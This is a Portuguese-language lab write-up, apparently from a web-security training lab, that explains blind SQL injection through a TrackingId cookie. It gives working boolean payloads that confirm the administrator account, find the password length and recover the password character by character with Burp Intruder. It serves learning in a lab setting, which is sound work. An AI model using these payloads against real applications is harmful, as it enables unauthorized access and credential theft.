# Blind SQL Injection with Conditional Responses

## Objetivo

Explorar uma Blind SQL Injection para descobrir a senha do usuário `administrator` através de respostas verdadeiro/falso da aplicação.

---

## O que chamou atenção

Diferente dos outros labs, aqui nenhum dado aparecia diretamente na tela.

A única pista era a mensagem:

```txt
Welcome back
```

Percebi que dava para usar essa mensagem como resposta booleana:

- Aparece → condição verdadeira
- Não aparece → condição falsa

---

## Teste inicial

```sql
TrackingId=xyz' AND '1'='1
```

Resultado:

```txt
Welcome back apareceu
```

---

```sql
TrackingId=xyz' AND '1'='2
```

Resultado:

```txt
Welcome back desapareceu
```

Isso confirmou que era possível fazer perguntas para o banco e descobrir respostas pelo comportamento da aplicação.

---

## Descobrindo informações

Verificar se existia usuário administrador:

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

Resultado:

- Usuário encontrado

---

## Descobrindo tamanho da senha

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

Fui aumentando:

```sql
>2
>3
>4
```

até encontrar:

```txt
20 caracteres
```

---

## Descobrindo caracteres da senha

```sql
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

Uso:

```sql
SUBSTRING(password,1,1)
```

para pegar:

- posição 1
- posição 2
- posição 3
- ...

Depois utilizei Burp Intruder com payloads:

```txt
a-z
0-9
```

e observava quando aparecia:

```txt
Welcome back
```

Quando aparecia, o caractere estava correto.

---

## Resultado

Foi possível descobrir toda a senha do usuário `administrator` caractere por caractere.

---

## Aprendizado

Esse laboratório mostrou algo que achei interessante:

Mesmo sem mostrar dados diretamente, uma aplicação ainda pode vazar informações pelo próprio comportamento.

O ataque basicamente virou:

```txt
Fazer pergunta
↓
Observar resposta
↓
Descobrir um caractere
↓
Repetir
```

Foi um dos labs mais desafiadores até agora porque exigiu mais lógica do que apenas inserir payloads.
